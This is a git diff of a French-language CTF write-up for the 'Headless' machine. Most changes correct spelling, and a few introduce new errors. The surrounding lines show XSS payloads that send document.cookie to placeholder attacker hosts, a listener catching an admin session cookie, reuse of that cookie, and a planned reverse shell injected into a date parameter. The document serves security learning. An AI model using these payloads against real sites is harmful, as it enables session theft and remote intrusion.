@@ -65,11 +65,11 @@ Le serveur distant hôte 2 services ouverts :
 
 ## Web Enumeration
 
-sur cette page web on peux y voir (Welcome to Our Website) avec un ancadres bleu avec ecrit (For Questions)
+sur cette page web on peut y voir (Welcome to Our Wite) avec un ancadres bleu avec écrit (For Questions)
 
 ![screen_web_site](/assets/img_Box_headless/Capture%20d’écran%202024-03-26%20à%2009.44.30.png)
 
-Cliquer sur le bouton puis nous acedons a une nouvelle page
+Cliquer sur le bouton puis nous accédons à une nouvelle page
 
 ![screen_web_site](/assets/img_Box_headless/Capture%20d’écran%202024-03-26%20à%2009.44.49.png)
 
@@ -116,19 +116,19 @@ XSS stocké : L'individu malveillant injecte le code directement dans le site we
 <script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
 <script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
 ```
-Nous allos choisir la commande suivante 
+Nous Allons choisissait la commande suivante
 ```bash
 <img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
 ```
-Nous allons changer notre user-agent pour un user-agent de google pour que le serveur accepte notre requete on crée un nouveau agent avec qui se nomme xss avec comme string la commande xss 
+Nous allons changer notre user-agent pour un user-agent de googler pour que le serveur accepte notre requête on crée un nouvel agent avec qui se nomme xss avec comme string la commande xss 
 ![User-agent](/assets/img_Box_headless/Capture%20d’écran%202024-03-26%20à%2010.49.23.png)
 
-avant de lancer l'attaque il faut creer un serveur pour recupérer les cookies
+avant de lancer l'attaque il faut creer un serveur pour récupérer les cookies
 ```bash
 python3 -m http.server 80
 ```
 
-une fois que l'attaques est lancée on peux voir que le serveur a recu les cookies 
+une fois que l'attaque est lancée on peut voir que le serveur a reçu les cookies
 ```bash
 [Mar 26, 2024 - 14:08:42 (CET)] exegol-htb /workspace: python3 -m http.server 9999
 Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
@@ -136,10 +136,10 @@ Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
 ```
 Nous avons recu le cookie is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
 
-on peux voir que l'on peux pas se connecter au /dashboard 
+on peut voir que l'on peut peut pas se connecter au /dashboard 
 ![cookie](/assets/img_Box_headless/Capture%20d’écran%202024-03-26%20à%2014.23.46.png)
 
-ducoup nous allons essayer de de connecter au /dashboard pour ca nous allons utiliser le cookie que nous avons recu 
+Du coup nous allons essayer de connecter au /dashboard pour ça nous allons utiliser le cookie que nous avons reçu 
  
  on va mettre le cookie dans une extension de navigateur avec [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search)
 
@@ -148,15 +148,15 @@ ducoup nous allons essayer de de connecter au /dashboard pour ca nous allons uti
 
  ![upload_cookie](/assets/img_Box_headless/Capture%20d’écran%202024-03-26%20à%2014.33.20.png)
 
- Une fois tout bien preparer on peux se connecter au /dashboard
+Une fois tout bien préparer on peut se connecter au /dashboard
 
 ![dashboard](/assets/img_Box_headless/Capture%20d’écran%202024-03-26%20à%2014.44.14.png)
 
-Nous allons voir les requetes http des date que l'on envoye au serveur via burpsuite
+Nous allons voir les requêtes http des dates que l'ont envoie au serveur via burpsuite
 
 ![burp](/assets/img_Box_headless/Capture%20d’écran%202024-03-26%20à%2014.50.48.png)
 
-On peux voir que le serveur envoie une requete POST avec un parametre date. On ajouter un reverse shell dans le parametre date
+On peut voir que le serveur envoie une requête POST avec un paramètre date. On ajoute un reversé shell dans le paramètre date
 
 crée un reverse shell dans un fichier shell.sh
 ```bash
